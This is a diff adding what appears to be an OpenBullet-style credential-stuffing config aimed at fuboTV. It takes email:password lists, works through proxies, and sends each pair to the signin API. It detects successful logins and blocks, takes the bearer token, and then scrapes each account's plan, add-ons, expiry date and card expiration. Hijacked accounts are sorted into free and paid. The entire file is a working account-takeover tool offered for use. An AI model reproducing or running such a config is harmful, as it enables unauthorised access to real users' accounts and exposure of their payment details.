@@ -1,0 +1,147 @@
+[SETTINGS]
+{
+  "Name": "fuboTV",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-05T18:17:48.8054131-05:00",
+  "AdditionalInfo": "Captures plan, addons, and card expiration. Sorts account based on capture.",
+  "Author": "The Architect",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#PUT_Login REQUEST PUT "https://api.fubo.tv/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fr;q=0.8" 
+  HEADER "content-length: 57" 
+  HEADER "origin: https://www.fubo.tv" 
+  HEADER "referer: https://www.fubo.tv/signin" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537." 
+  HEADER "x-client-version: R20200131.2" 
+  HEADER "x-device-app: web" 
+  HEADER "x-device-category: desktop" 
+  HEADER "x-device-id: QOiRWtf-qFFOrFBbPk" 
+  HEADER "x-device-model: Windows NT 10.0 Chrome 79.0.3945.130" 
+  HEADER "x-device-platform: desktop" 
+  HEADER "x-device-type: desktop" 
+  HEADER "x-player-version: 1.25.0" 
+  HEADER "x-preferred-language: en-US" 
+
+#Check_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+    KEY "token_type\":\"Bearer" 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_USERNAME_PASSWORD" 
+    KEY "The username and/or password used for authentication are invalid" 
+    KEY "The username and/or password used for authentication are invalid" 
+  KEYCHAIN Ban OR 
+    KEY "You have been blocked," 
+    KEY "code\":\"BLOCKED" 
+    KEY "\"error\": { \"message\":\"You have been blocked, please contact support at " 
+
+#Variable_Token PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+#GET_Account_Info REQUEST GET "https://api.fubo.tv/user" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fr;q=0.8" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "origin: https://www.fubo.tv" 
+  HEADER "referer: https://www.fubo.tv/signin" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
+  HEADER "x-client-version: R20200131.2" 
+  HEADER "x-device-app: web" 
+  HEADER "x-device-category: desktop" 
+  HEADER "x-device-id: QOiRWtf-qFFOrFBbPk" 
+  HEADER "x-device-model: Windows NT 10.0 Chrome 79.0.3945.130" 
+  HEADER "x-device-platform: desktop" 
+  HEADER "x-device-type: desktop" 
+  HEADER "x-player-version: 1.25.0" 
+  HEADER "x-preferred-language: en-US" 
+
+#Capture_Subscription_Plan PARSE "<SOURCE>" LR "\":{\"name\":\"fubo\",\"plan_code\":\"" "\",\"" -> VAR "PlanA" 
+
+#Make_Capture_Look_Better_(Plan) FUNCTION Replace "fubotv-" "fuboTV " "<PlanA>" -> CAP "Plan" 
+
+#Sort_Free_From_Paid KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Plan>" DoesNotExist 
+  KEYCHAIN Success OR 
+    KEY "<Plan>" Exists 
+
+#Capture_Plan_Addons PARSE "<SOURCE>" LR "add_on_code\":\"" "\",\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Plan Addons" 
+
+#Capture_Plan_Expiration PARSE "<SOURCE>" LR "current_period_ends_at\":\"" "T" CreateEmpty=FALSE -> CAP "Plan Expires" "on " "" 
+
+#Capture_Card_Expiration_Month PARSE "<SOURCE>" LR "\",\"month\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Card Expiration Month" 
+
+#Capture_Card_Expiration_Year PARSE "<SOURCE>" LR "\",\"year\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Card Expiration Year" 
+
+#Sort_Free_From_Paid KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Card Expiration Year>" Contains "2019" 
+    KEY "<Card Expiration Year>" Contains "2016" 
+    KEY "<Card Expiration Year>" Contains "2017" 
+    KEY "<Card Expiration Year>" Contains "2018" 
+    KEY "<Card Expiration Year>" Contains "2015" 
+    KEY "<Card Expiration Year>" DoesNotExist 
+  KEYCHAIN Success OR 
+    KEY "<Card Expiration Year>" Contains "2020" 
+    KEY "<Card Expiration Year>" Contains "2021" 
+    KEY "<Card Expiration Year>" Contains "2022" 
+    KEY "<Card Expiration Year>" Contains "2023" 
+    KEY "<Card Expiration Year>" Contains "2024" 
+    KEY "<Card Expiration Year>" Contains "2025" 
+    KEY "<Card Expiration Year>" Contains "2026" 
+    KEY "<Card Expiration Year>" Contains "2027" 
+    KEY "<Card Expiration Year>" Contains "2028" 
+    KEY "<Card Expiration Year>" Contains "2029" 
+    KEY "<Card Expiration Year>" Contains "2030" 
+
